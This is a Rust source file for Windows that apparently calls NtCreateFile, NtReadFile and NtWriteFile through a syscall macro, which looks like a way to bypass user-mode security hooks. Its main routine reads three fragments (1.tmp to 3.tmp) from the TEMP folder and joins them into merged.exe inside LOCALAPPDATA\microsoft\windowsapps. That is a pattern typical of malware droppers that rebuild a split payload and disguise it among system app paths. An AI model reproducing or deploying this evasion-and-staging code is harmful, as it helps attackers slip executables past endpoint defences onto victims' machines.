#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

mod syscalls;

use std::ptr::{null, null_mut};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};
use windows_sys::Win32::Storage::FileSystem::{
    FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, SYNCHRONIZE,
    FILE_READ_DATA, FILE_WRITE_DATA,
};
use windows_sys::Win32::System::Environment::GetEnvironmentVariableW;
use std::ffi::c_void;

// NT constants
const FILE_OPEN: u32 = 0x00000001;
const FILE_OVERWRITE_IF: u32 = 0x00000005;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

fn get_env_var(name: &str) -> String {
    let name_u16: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut buffer = [0u16; 1024];
    let len = unsafe {
        GetEnvironmentVariableW(name_u16.as_ptr(), buffer.as_mut_ptr(), buffer.len() as u32)
    };
    if len == 0 {
        return String::new();
    }
    String::from_utf16_lossy(&buffer[..len as usize])
}

fn to_nt_path(path: &str) -> Vec<u16> {
    let nt_path = format!("\\??\\{}", path);
    nt_path.encode_utf16().chain(std::iter::once(0)).collect()
}

unsafe fn create_unicode_string(path_u16: &[u16]) -> UNICODE_STRING {
    let len = (path_u16.len() - 1) * 2; // exclude null terminator, in bytes
    UNICODE_STRING {
        Length: len as u16,
        MaximumLength: (len + 2) as u16,
        Buffer: path_u16.as_ptr() as *mut u16,
    }
}

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: HANDLE,
    ObjectName: *const UNICODE_STRING,
    Attributes: u32,
    SecurityDescriptor: *const c_void,
    SecurityQualityOfService: *const c_void,
}

#[repr(C)]
struct IO_STATUS_BLOCK {
    Status: NTSTATUS,
    Information: usize,
}

fn read_file_syscall(path: &str) -> Vec<u8> {
    unsafe {
        let nt_path_u16 = to_nt_path(path);
        let unicode_string = create_unicode_string(&nt_path_u16);

        let obj_attr = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &unicode_string,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: null(),
            SecurityQualityOfService: null(),
        };

        let mut handle: HANDLE = 0;
        let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };

        let status = syscall!(
            "NtCreateFile",
            &mut handle,
            FILE_READ_DATA | SYNCHRONIZE,
            &obj_attr,
            &mut io_status,
            null_mut::<c_void>(),
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut::<c_void>(),
            0
        );

        if status != 0 {
            // STATUS_OBJECT_NAME_NOT_FOUND = 0xC0000034
            if status as u32 != 0xC0000034 {
                println!("Failed to open file {}: status 0x{:x}", path, status);
            }
            return Vec::new();
        }

        let mut data = Vec::new();
        let mut buffer = [0u8; 8192];
        loop {
            let status = syscall!(
                "NtReadFile",
                handle,
                0,
                null_mut::<c_void>(),
                null_mut::<c_void>(),
                &mut io_status,
                buffer.as_mut_ptr(),
                buffer.len() as u32,
                null_mut::<c_void>(),
                null_mut::<c_void>()
            );

            if status != 0 {
                if status as u32 == 0xC0000011 { // STATUS_END_OF_FILE
                    break;
                }
                println!("Error reading file: 0x{:x}", status);
                break;
            }

            if io_status.Information == 0 {
                break;
            }

            data.extend_from_slice(&buffer[..io_status.Information]);

            if io_status.Information < buffer.len() {
                break;
            }
        }

        syscall!("NtClose", handle);
        data
    }
}

fn write_file_syscall(path: &str, data: &[u8]) -> bool {
    unsafe {
        let nt_path_u16 = to_nt_path(path);
        let unicode_string = create_unicode_string(&nt_path_u16);

        let obj_attr = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &unicode_string,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: null(),
            SecurityQualityOfService: null(),
        };

        let mut handle: HANDLE = 0;
        let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };

        let status = syscall!(
            "NtCreateFile",
            &mut handle,
            FILE_WRITE_DATA | SYNCHRONIZE,
            &obj_attr,
            &mut io_status,
            null_mut::<c_void>(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut::<c_void>(),
            0
        );

        if status != 0 {
            println!("Failed to create file {}: status 0x{:x}", path, status);
            return false;
        }

        let status = syscall!(
            "NtWriteFile",
            handle,
            0,
            null_mut::<c_void>(),
            null_mut::<c_void>(),
            &mut io_status,
            data.as_ptr(),
            data.len() as u32,
            null_mut::<c_void>(),
            null_mut::<c_void>()
        );

        if status != 0 {
            println!("Error writing file: 0x{:x}", status);
        }

        syscall!("NtClose", handle);
        status == 0
    }
}

fn main() {
    let temp_dir = get_env_var("TEMP");
    let local_app_data = get_env_var("LOCALAPPDATA");

    if temp_dir.is_empty() || local_app_data.is_empty() {
        println!("Could not resolve environment variables.");
        return;
    }

    let file1_path = format!("{}\\{}", temp_dir, "1.tmp");
    let file2_path = format!("{}\\{}", temp_dir, "2.tmp");
    let file3_path = format!("{}\\{}", temp_dir, "3.tmp");
    let output_path = format!("{}\\microsoft\\windowsapps\\merged.exe", local_app_data);

    println!("Merging files from {} into {}", temp_dir, output_path);

    let mut merged_data = Vec::new();

    for path in &[&file1_path, &file2_path, &file3_path] {
        println!("Reading {}...", path);
        let data = read_file_syscall(path);
        if data.is_empty() {
            println!("Warning: file {} is empty or could not be read.", path);
        }
        merged_data.extend(data);
    }

    if merged_data.is_empty() {
        println!("No data to write.");
        return;
    }

    println!("Writing merged data to {} ({} bytes)...", output_path, merged_data.len());
    if write_file_syscall(&output_path, &merged_data) {
        println!("Success!");
    } else {
        println!("Failed to write merged file.");
    }
}
